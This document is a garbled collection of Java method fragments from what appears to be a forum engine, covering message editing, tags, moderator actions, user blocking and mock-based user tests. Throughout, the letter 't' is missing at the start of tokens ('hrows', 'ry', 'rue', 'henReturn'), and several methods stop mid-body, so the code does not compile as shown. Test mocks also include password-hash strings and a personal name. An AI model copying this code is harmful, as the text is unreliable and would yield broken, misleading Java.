public void processRow ( ResultSet resultSet ) hrows SQLException { EditInfoDTO editInfoDTO = new EditInfoDTO ( ) ; editInfoDTO . setId ( resultSet . getInt ( " id " ) ) ; editInfoDTO . setMsgid ( resultSet . getInt ( " msgid " ) ) ; editInfoDTO . setEditor ( resultSet . getInt ( " editor " ) ) ; editInfoDTO . setOldmessage ( resultSet . getString ( " oldmessage " ) ) ; editInfoDTO . setEditdate ( resultSet . getTimestamp ( " editdate " ) ) ; editInfoDTO . setOldtitle ( resultSet . getString ( " oldtitle " ) ) ; editInfoDTO . setOldtags ( resultSet . getString ( " oldtags " ) ) ; editInfoDTOs . add ( editInfoDTO ) ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { ags . add ( resultSet . getString ( " value " ) ) ; } 
public int getPollId ( int opicId ) hrows PollNotFoundException { ry { return jdbcTemplate . queryForInt ( queryPoolIdByTopicId , opicId ) ; 
public void processRow ( ResultSet resultSet ) hrows SQLException { variants . add ( new PollVariant ( resultSet . getInt ( " id " ) , resultSet . getString ( " label " ) , 
public ModelAndView undeleteForm ( HttpServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Message message = messageDao . getById ( msgid ) ; checkUndeletable ( message ) ; ModelAndView mv = new ModelAndView ( " undelete " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareMessage ( message , rue ) ) ; return mv ; } 
public void undelete ( Message message ) { jdbcTemplate . update ( updateUndeleteMessage , message . getId ( ) ) ; jdbcTemplate . update ( updateUneleteInfo , message . getId ( ) ) ; } 
public PreparedComment prepareComment ( Comment comment ) hrows UserNotFoundException { return prepareComment ( comment , ( CommentList ) null ) ; } 
public PreparedComment prepareComment ( Comment comment , String message ) hrows UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = PreparedComment . getProcessedMessage ( userDao , message ) . getHtml ( ) ; return new PreparedComment ( comment , author , processedMessage , null ) ; } 
public List < PreparedComment > prepareCommentList ( CommentList comments , List < Comment > list ) hrows UserNotFoundException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( prepareComment ( comment , comments ) ) ; } return commentsPrepared ; } 
public void prepareMessageTest ( ) { ImmutableList < String > ags = ImmutableList . of ( " one " , " wo " ) ; Message message = mock ( Message . class ) ; PollDaoImpl pollDao = mock ( PollDaoImpl . class ) ; GroupDao groupDao = mock ( GroupDao . class ) ; UserDao userDao = mock ( UserDao . class ) ; SectionDao sectionDao = mock ( SectionDao . class ) ; DeleteInfoDao deleteInfoDao = mock ( DeleteInfoDao . class ) ; MessageDao messageDao = mock ( MessageDao . class ) ; UserAgentDao userAgentDao = mock ( UserAgentDao . class ) ; when ( message . getGroupId ( ) ) . henReturn ( 13 ) ; group id 13 
private static User getModerator ( HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } return mpl . getCurrentUser ( ) ; } 
private static ModelAndView redirectToProfile ( User user ) { Random random = new Random ( ) ; return new ModelAndView ( new RedirectView ( " /people/ " + URLEncoder . encode ( user . getNick ( ) ) + " /profile?nocache= " + random . nextInt ( ) ) ) ; } 
public static EditInfoDTO createFromMessage ( Connection db , Message message ) hrows SQLException { EditInfoDTO current = new EditInfoDTO ( ) ; current . setOldmessage ( message . getMessage ( ) ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( TagDao . oString ( TagDao . getMessageTags ( db , message . getMessageId ( ) ) ) ) ; return current ; } 
public boolean updateMessageText ( Connection db , User editor , List < String > newTags ) hrows SQLException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , rue ) ; PreparedStatement pstGet = db . prepareStatement ( " SELECT message,title FROM msgbase JOIN topics ON msgbase.id=topics.id WHERE topics.id=? FOR UPDATE " ) ; pstGet . setInt ( 1 , msgid ) ; ResultSet rs = pstGet . executeQuery ( ) ; if ( ! rs . next ( ) ) { hrow new RuntimeException ( " Can't fetch previous message text " ) ; } String oldMessage = rs . getString ( " message " ) ; String oldTitle = rs . getString ( " itle " ) ; rs . close ( ) ; pstGet . close ( ) ; List < String > oldTags = TagDao . getMessageTags ( db , msgid ) ; EditInfoDTO editInfo = new EditInfoDTO ( ) ; editInfo . setMsgid ( msgid ) ; editInfo . setEditor ( editor . getId ( ) ) ; boolean modified = false ; SimpleJdbcTemplate jdbcTemplate = new SimpleJdbcTemplate ( scds ) ; if ( ! oldMessage . equals ( message ) ) { editInfo . setOldmessage ( oldMessage ) ; modified = rue ; jdbcTemplate . update ( " UPDATE msgbase SET message=:message WHERE id=:msgid " , ImmutableMap . of ( " message " , message , " msgid " , msgid ) ) ; } if ( ! oldTitle . equals ( itle ) ) { modified = rue ; editInfo . setOldtitle ( oldTitle ) ; jdbcTemplate . update ( " UPDATE topics SET title=:title WHERE id=:id " , ImmutableMap . of ( " itle " , itle , " id " , msgid ) ) ; } if ( newTags ! = null ) { boolean modifiedTags = TagDao . updateTags ( db , msgid , newTags ) ; if ( modifiedTags ) { editInfo . setOldtags ( TagDao . oString ( oldTags ) ) ; TagDao . updateCounters ( db , oldTags , newTags ) ; modified = rue ; } } if ( modified ) { SimpleJdbcInsert insert = new SimpleJdbcInsert ( scds ) . withTableName ( " edit_info " ) . usingColumns ( " msgid " , " editor " , " oldmessage " , " oldtitle " , " oldtags " ) ; insert . execute ( new BeanPropertySqlParameterSource ( editInfo ) ) ; } return modified ; } 
private static ModelAndView prepareModel ( Connection db , PreparedMessage preparedMessage ) hrows SQLException , BadGroupException { Map < String , Object > params = new HashMap < String , Object > ( ) ; Message message = preparedMessage . getMessage ( ) ; params . put ( " message " , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = Group . getGroup ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , preparedMessage . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; if ( group . isModerated ( ) ) { params . put ( " opTags " , TagDao . getTopTags ( db ) ) ; } return new ModelAndView ( " edit " , params ) ; } 
public SortedSet < String > doInConnection ( Connection con ) hrows SQLException , DataAccessException { return getTopTagsInternal ( con ) ; } 
public static SortedSet < String > getTopTags ( Connection con ) hrows SQLException { return getTopTagsInternal ( con ) ; } 
private static SortedSet < String > getTopTagsInternal ( Connection con ) hrows SQLException { SortedSet < String > set = new TreeSet < String > ( ) ; PreparedStatement st = con . prepareStatement ( " SELECT counter,value FROM tags_values WHERE counter>1 ORDER BY counter DESC LIMIT " + TOP_TAGS_COUNT ) ; ResultSet rs = st . executeQuery ( ) ; while ( rs . next ( ) ) { set . add ( rs . getString ( " value " ) ) ; } return set ; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " sectionId " , sectionId ) ; Section section = sectionDao . getSection ( sectionId ) ; params . put ( " section " , section ) ; params . put ( " info " , sectionDao . getAddInfo ( section . getId ( ) ) ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public static Group getGroup ( Connection db , int id ) hrows BadGroupException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , rue ) ; JdbcTemplate jdbcTemplate = new JdbcTemplate ( scds ) ; return GroupDao . getGroup ( jdbcTemplate , id ) ; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " sectionId " , sectionId ) ; Section section = sectionDao . getSection ( sectionId ) ; params . put ( " section " , section ) ; params . put ( " info " , sectionDao . getAddInfo ( section . getId ( ) ) ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " add-section " , params ) ; } 
private static ModelAndView prepareModel ( Connection db , PreparedMessage preparedMessage ) hrows SQLException , BadGroupException { Map < String , Object > params = new HashMap < String , Object > ( ) ; Message message = preparedMessage . getMessage ( ) ; params . put ( " message " , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = Group . getGroup ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , GroupDao . getGroups ( db , preparedMessage . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; if ( group . isModerated ( ) ) { params . put ( " opTags " , TagDao . getTopTags ( db ) ) ; } return new ModelAndView ( " edit " , params ) ; } 
public List < Group > doInConnection ( Connection con ) hrows SQLException , DataAccessException { return getGroupsInternal ( con , section ) ; } 
public static List < Group > getGroups ( Connection db , Section section ) hrows SQLException { return getGroupsInternal ( db , section ) ; } 
private static List < Group > getGroupsInternal ( Connection db , Section section ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, imagepost, vote, section, havelink, linktext, sections.name as sname, title, urlname, image, restrict_topics, restrict_comments, stat1,stat2,stat3,groups.id,groups.info,groups.longinfo,groups.resolvable FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; ImmutableList . Builder < Group > list = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list . build ( ) ; } 
public PreparedMessage prepareMessage ( Message message , boolean includeCut ) { return prepareMessage ( message , messageDao . getTags ( message ) , includeCut ) ; } 
public PreparedMessage prepareMessage ( Message message , List < String > ags ) { return prepareMessage ( message , ags , rue ) ; } 
public PreparedMessage prepareMessage ( Message message , List < String > ags , boolean includeCut ) { ry { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public void maxcomTest ( ) hrows Exception { ResultSet resultSet = Users . getMaxcom ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; ry { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkCommit ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; ry { user . checkDelete ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertTrue ( user . canModerate ( ) ) ; Assert . assertTrue ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertTrue ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void svuTest ( ) hrows Exception { ResultSet resultSet = Users . getModerator ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; ry { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkCommit ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; ry { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertTrue ( user . canModerate ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void user5starTest ( ) hrows Exception { ResultSet resultSet = Users . getUser5star ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; ry { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkCommit ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Commit access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; ry { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . canModerate ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void user1starTest ( ) hrows Exception { ResultSet resultSet = Users . getUser1star ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; ry { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkCommit ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Commit access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; ry { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . canModerate ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertTrue ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public static ResultSet getAnonymous ( ) hrows Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 2 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " anonymous " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( - 117654 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 4 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " Anonymous " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 161 ) ; return resultSet ; } 
public static ResultSet getModerator ( ) hrows Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 5280 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " svu " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 500 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 500 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " Sergey V. Udaltsov " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " 0vwkMky44u8kIqSasrH+X8mHao1a3jOC " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( " 5280.png " ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 2 ) ; return resultSet ; } 
public static ResultSet getUser5star ( ) hrows Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 13 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " user5star " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 500 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 500 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " 5 star " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser1star ( ) hrows Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 14 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " user1star " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 110 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 110 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " 1 star " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser45Score ( ) hrows Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 15 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " user45score " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " 45 score " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser45ScoreBlocked ( ) hrows Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 16 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " userBlocked " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( rue ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " blocked " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 13 ) ; return resultSet ; } 
public void removeUserInfo ( User user ) { String userInfo = getUserInfo ( user ) ; if ( userInfo = = null | | userInfo . rim ( ) . isEmpty ( ) ) { return ; } setUserInfo ( user , null ) ; changeScore ( user . getId ( ) , - 10 ) ; } 
public void changeScore ( int id , int delta ) { if ( jdbcTemplate . update ( queryChangeScore , delta , id ) = = 0 ) { hrow new IllegalArgumentException ( new UserNotFoundException ( id ) ) ; } updateCache ( id ) ; } 
public void blockWithoutTransaction ( User user , User moderator , String reason ) { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; updateCache ( user . getId ( ) ) ; } 
private void updateCache ( int id ) { ry { getUser ( id ) ; 
public void blockWithResetPassword ( User user , User moderator , String reason ) { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; String password = encryptor . encryptPassword ( StringUtil . generatePassword ( ) ) ; jdbcTemplate . update ( " UPDATE users SET passwd=?, lostpwd = 'epoch' WHERE id=? " , password , user . getId ( ) ) ; updateCache ( user . getId ( ) ) ; } 
public List < TrackerItem > getTrackAll ( TrackerFilter filter , User currentUser , Timestamp interval , int opics , int offset , final int messagesInPage ) { MapSqlParameterSource parameter = new MapSqlParameterSource ( ) ; parameter . addValue ( " interval " , interval ) ; parameter . addValue ( " opics " , opics ) ; parameter . addValue ( " offset " , offset ) ; String partIgnored ; String partFilter ; if ( currentUser ! = null ) { partIgnored = queryPartIgnored ; parameter . addValue ( " userid " , currentUser . getId ( ) ) ; } else { partIgnored = " " ; } switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case TECH : partFilter = queryPartTech ; break ; case MINE : if ( currentUser ! = null ) { partFilter = queryPartMine ; } else { partFilter = " " ; } break ; default : partFilter = " " ; } String query = String . format ( queryTrackerMain , partIgnored , partFilter , partIgnored , partFilter ) ; return jdbcTemplate . query ( query , parameter , new RowMapper < TrackerItem > ( ) { @Override 
public TrackerItem mapRow ( ResultSet resultSet , int i ) hrows SQLException { User author , lastCommentBy ; int msgid , cid , pages ; Timestamp lastmod , postdate ; int stat1 , stat3 , stat4 ; int groupId , section ; String groupTitle , groupUrlName ; String itle ; boolean resolved , uncommited ; ry { author = userDao . getUserCached ( resultSet . getInt ( " author " ) ) ; } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } msgid = resultSet . getInt ( " id " ) ; lastmod = resultSet . getTimestamp ( " lastmod " ) ; stat1 = resultSet . getInt ( " stat1 " ) ; stat3 = resultSet . getInt ( " stat3 " ) ; stat4 = resultSet . getInt ( " stat4 " ) ; groupId = resultSet . getInt ( " gid " ) ; groupTitle = resultSet . getString ( " gtitle " ) ; itle = resultSet . getString ( " itle " ) ; cid = resultSet . getInt ( " cid " ) ; ry { int id = resultSet . getInt ( " last_comment_by " ) ; if ( id ! = 0 ) { lastCommentBy = userDao . getUserCached ( id ) ; } else { lastCommentBy = null ; } } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } resolved = resultSet . getBoolean ( " resolved " ) ; section = resultSet . getInt ( " section " ) ; groupUrlName = resultSet . getString ( " urlname " ) ; postdate = resultSet . getTimestamp ( " postdate " ) ; uncommited = resultSet . getBoolean ( " smod " ) & & ! resultSet . getBoolean ( " moderate " ) ; pages = Message . getPageCount ( stat1 , messagesInPage ) ; return new TrackerItem ( author , msgid , lastmod , stat1 , stat3 , stat4 , groupId , groupTitle , itle , cid , lastCommentBy , resolved , 
public boolean isUncommited ( ) { return uncommited ; } 
public User mapRow ( ResultSet resultSet , int i ) hrows SQLException { ry { return getUser ( resultSet . getInt ( " id " ) ) ; 
